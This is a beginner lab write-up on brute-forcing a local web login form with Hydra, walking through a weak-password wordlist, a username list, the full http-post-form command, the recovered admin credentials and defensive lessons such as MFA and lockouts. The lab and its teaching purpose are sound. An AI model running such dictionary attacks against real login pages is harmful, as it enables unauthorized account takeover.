# 🔐 Using Hydra to Crack Passwords

---

## 📌 Lab Information

**Platform:** LabEx  
**Difficulty:** Beginner  
**Category:** Password Security / Brute Force Attacks

**Lab Link:**  
https://labex.io/labs/linux-using-hydra-to-crack-passwords-415960?course=cybersecurity-labs-for-beginners

---

# 📝 Introduction

Passwords remain one of the most common methods of authentication across websites, applications, and enterprise systems. Unfortunately, weak passwords continue to be a major security risk and are often exploited through brute-force and dictionary attacks.

In this lab, I explored how attackers can leverage **Hydra**, a powerful password auditing tool, to automate authentication attempts against a web login form. The exercise demonstrates why weak passwords are dangerous and highlights the importance of implementing security controls such as account lockouts, rate limiting, and multi-factor authentication.

### Learning Objectives

- Understand brute-force attacks
- Understand dictionary attacks
- Learn how Hydra works
- Configure Hydra against an HTTP login form
- Analyze successful login attempts
- Understand password security best practices

---

# 🔎 Exploring the Target Website

The first step was to investigate the target application running on port **8080**.

Opening the web interface revealed a basic login page requiring a username and password.

## Login Page

<img width="1200" height="862" alt="image" src="https://github.com/user-attachments/assets/a3dfae78-5dd3-48af-8c24-763d659ef59f" />

The application contains:

- Username field
- Password field
- Login button

---

## Manual Authentication Attempts

Before using automated tools, I attempted several manual logins.

### Attempt 1

```text
Username: test
Password: password123
```

### Attempt 2

```text
Username: admin
Password: admin
```

Both attempts returned the following message:

```text
Invalid username or password
```

### Failed Login Attempt

<img width="1120" height="763" alt="image" src="https://github.com/user-attachments/assets/47e6dc1c-e734-4cb3-9f47-cdd95cd121fd" />

### Observation

The application returns a generic error message instead of revealing:

- Whether the username exists
- Whether only the password is incorrect

This helps prevent username enumeration attacks.

---

# ⚔️ Understanding Brute-Force Attacks

The manual login attempts performed above represent a basic brute-force process.

A brute-force attack involves:

1. Selecting a target account
2. Trying multiple password combinations
3. Automating the process
4. Continuing until valid credentials are discovered

### Security Weaknesses Identified

The application does not implement:

- Account lockout policies
- CAPTCHA challenges
- Rate limiting
- Multi-factor authentication

Without these protections, automated password attacks become much more effective.

---

# 📖 Examining the Password Dictionary

Attackers often use password lists compiled from previous data breaches.

The lab provided a password dictionary named:

```bash
500-worst-passwords.txt
```

To inspect the contents:

```bash
head -n 10 500-worst-passwords.txt
```

### Viewing the Password List

<img width="1192" height="540" alt="image" src="https://github.com/user-attachments/assets/c5631846-d34f-474c-b549-2239f4ca23aa" />

Example output:

```text
123456
password
12345678
qwerty
abc123
```

### Analysis

These passwords are:

- Commonly used
- Easy to guess
- Frequently found in leaked databases

This attack method is known as a **dictionary attack** because it uses a predefined list of likely passwords.

---

# ⚙️ Setting Up Hydra

Hydra requires both a username list and a password list.

## Creating a Username List

Navigate to the project directory:

```bash
cd ~/project
```

Create the username file:

```bash
echo -e "admin\nuser\nroot" > usernames.txt
```

Verify the contents:

```bash
cat usernames.txt
```

Output:

```text
admin
user
root
```

### Username File

<img width="1060" height="257" alt="image" src="https://github.com/user-attachments/assets/ea63d8c1-4dbe-48cd-ab74-83198b67544a" />

### Why These Usernames?

These are among the most commonly targeted usernames because they frequently appear as:

- Administrative accounts
- Default system accounts
- Legacy user accounts

---

# 🔍 Verifying Hydra Installation

Before performing the attack, verify Hydra is installed:

```bash
hydra -h
```

### Hydra Help Menu


<img width="843" height="870" alt="image" src="https://github.com/user-attachments/assets/5b3fada0-7732-4d50-8bf2-9d3b89b1d380" />


The help menu displays:

- Supported protocols
- Available options
- Usage examples

Hydra supports many services including:

- HTTP
- HTTPS
- FTP
- SSH
- SMB
- Telnet

---

# 🚀 Performing the Hydra Attack

The following command was used:

```bash
hydra \
-L ~/project/usernames.txt \
-P ~/project/500-worst-passwords.txt \
localhost \
-s 8080 \
http-post-form "/:username=^USER^&password=^PASS^:Invalid username or password" \
-o ~/project/hydra_results.txt
```

---

## Command Breakdown

### Username List

```bash
-L usernames.txt
```

Loads usernames to test.

### Password List

```bash
-P 500-worst-passwords.txt
```

Loads password candidates.

### Target

```bash
localhost -s 8080
```

Specifies:

- Host = localhost
- Port = 8080

### HTTP Form Module

```bash
http-post-form
```

Tells Hydra the target is a web login form using HTTP POST requests.

### Failure Condition

```bash
Invalid username or password
```

Hydra identifies failed logins by searching for this string in the server response.

### Output File

```bash
-o hydra_results.txt
```

Stores successful authentication results.

---

# 🎯 Attack Execution

Once executed, Hydra automatically attempted every username and password combination.

### Hydra Running

<img width="1212" height="287" alt="image" src="https://github.com/user-attachments/assets/22ea3913-b206-45d3-bf50-1fdfbd60e163" />

Hydra systematically tested:

```text
admin + password list
user + password list
root + password list
```

until valid credentials were discovered.

---

# 📂 Reviewing Results

After completion:

```bash
cat hydra_results.txt
```

### Hydra Results

<img width="1213" height="151" alt="image" src="https://github.com/user-attachments/assets/59f411bd-9802-4e30-856c-cbc214ddeab3" />

Example:

```text
login: admin
password: secretpassword
```

This indicates that Hydra successfully identified valid credentials.

---

# 🔓 Logging In with Discovered Credentials

The discovered credentials were then tested on the web application.

### Successful Login

<img width="687" height="543" alt="image" src="https://github.com/user-attachments/assets/168765d3-702c-4696-9b81-3070657c2820" />

The login succeeded, demonstrating how vulnerable weak passwords are to automated attacks.

---

# 🛡️ Security Lessons Learned

## Weak Passwords Are Dangerous

Simple passwords are often included in publicly available password lists.

---

## Dictionary Attacks Are Efficient

Attackers rarely attempt random passwords.

Instead, they prioritize known passwords from:

- Data breaches
- Public password dictionaries
- Credential dumps

---

## Automation Scales Attacks

Hydra can test hundreds or thousands of credentials in a short period of time.

---

## Strong Authentication Matters

Organizations should implement:

- Strong password policies
- Multi-factor authentication (MFA)
- Rate limiting
- Account lockout policies
- CAPTCHA protections

---

# 📚 Key Takeaways

✅ Explored a vulnerable login page

✅ Learned how brute-force attacks work

✅ Examined a password dictionary

✅ Created a username wordlist

✅ Configured Hydra for HTTP authentication

✅ Successfully performed a dictionary attack

✅ Retrieved valid credentials

✅ Understood the importance of password security

---

# 🏷️ Tags

```text
Hydra
Password Cracking
Brute Force
Dictionary Attack
Linux
Cybersecurity
Web Security
Authentication
Ethical Hacking
Penetration Testing
```

---

## ⭐ Conclusion

This lab provided practical experience with Hydra and demonstrated how easily weak passwords can be compromised through automated attacks. The exercise reinforced the importance of strong authentication controls and highlighted how security professionals can use tools like Hydra to identify vulnerabilities before malicious actors exploit them.
